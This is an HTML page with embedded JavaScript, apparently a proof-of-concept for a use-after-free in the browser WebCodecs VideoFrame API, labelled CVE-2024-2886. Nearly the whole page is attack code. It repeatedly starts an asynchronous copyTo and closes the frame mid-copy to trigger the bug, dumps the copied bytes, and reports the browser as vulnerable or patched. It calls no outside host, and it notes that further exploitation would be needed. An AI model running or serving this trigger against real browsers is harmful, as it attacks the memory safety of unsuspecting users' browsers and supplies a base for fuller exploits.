<!doctype html>
<html>
<head><title>q1shell</title></head>
<body style="background:#000;color:#fff;font-family:monospace;font-size:12px;padding:0px;">
<div id="out"></div>
<script>
const log = s => { out.innerHTML += s + '<br>'; console.log(s); };

async function pwn() {
    log('CVE-2024-2886 — WebCodecs VideoFrame UAF');
    log('No codec needed - direct VideoFrame from canvas');
    log('');

    if (typeof VideoFrame === 'undefined') {
        log('ERROR: VideoFrame not available'); return false;
    }
    log('[+] VideoFrame available');

    // Create VideoFrame directly from canvas - no encoder/decoder needed
    const canvas = new OffscreenCanvas(64, 64);
    const ctx = canvas.getContext('2d');

    let succeeded = 0, failed = 0;

    for (let attempt = 0; attempt < 20; attempt++) {
        // Draw something to the canvas
        ctx.fillStyle = `hsl(${attempt * 18}, 100%, 50%)`;
        ctx.fillRect(0, 0, 64, 64);

        // Create VideoFrame directly from canvas
        const frame = new VideoFrame(canvas, { timestamp: attempt * 1000 });
        const size = frame.allocationSize();
        const buf = new Uint8Array(size);

        // THE RACE: start async copyTo, immediately close the frame
        const promise = frame.copyTo(buf);
        frame.close(); // UAF trigger - free frame while copy is in flight

        try {
            const layout = await promise;
            succeeded++;
            const hex = Array.from(buf.slice(0, 8))
                .map(x => x.toString(16).padStart(2,'0')).join(' ');
            log('[+] #' + attempt + ': copyTo OK after close [' + hex + '] size=' + size);
        } catch(e) {
            failed++;
            log('[!] #' + attempt + ': ' + e.message);
        }
    }

    log('');
    log('Results: ' + succeeded + ' succeeded, ' + failed + ' failed');

    if (succeeded > 0 && failed === 0) {
        log('UNPATCHED: copyTo always succeeds after close');
        log('(This is expected - bug exists but may need exploit to be useful)');
        return true;
    } else if (succeeded > 0 && failed > 0) {
        log('RACE CONDITION: sometimes succeeds, sometimes fails');
        log('UAF confirmed - timing-dependent');
        return true;
    } else {
        log('PATCHED: copyTo always throws after close');
        return false;
    }
}

pwn().then(r => {
    log('');
    log('RESULT: ' + (r ? 'VULNERABLE' : 'PATCHED'));
});
</script>
</body>
</html>
